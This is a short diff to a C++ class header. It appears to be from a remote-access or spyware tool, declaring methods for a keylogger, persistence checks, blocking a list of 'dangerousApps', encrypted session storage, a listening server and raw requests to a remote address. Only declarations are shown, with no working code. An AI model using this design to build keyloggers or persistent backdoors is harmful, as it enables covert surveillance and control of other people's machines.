@@ -44,7 +44,8 @@ private:
 	std::string LoadValueReg(const char* path, const char* key);
 	void SaveSession(const char* EncryptionKey);
 	void LoadSession(const char* EncryptionKey);
-	//void SaveFileDir(const char* path);
+	void SaveValueToFile(const char* value, const char* path = NULL);
+	std::string LoadValueFromFile(const char* path = NULL);
 public:
 	std::list<const char*> dangerousApps;
 	const char* EncryptionKey;
@@ -61,8 +62,9 @@ public:
 	void BlockApps();
 	void UnBlockApps();
 	void Keylogger(const char* fileName);
-	bool CheckExistance();
-	//void FirstRun();
+	bool CheckSession();
+	bool CheckPersistance();
+	void Initialize(const char* EncryptionKey);
 
 	int StartServer(const char* port, const char* EncryptionKey = NULL);
 	const char* RawRequest(const char * serverAddress, const char* port, const char* request);
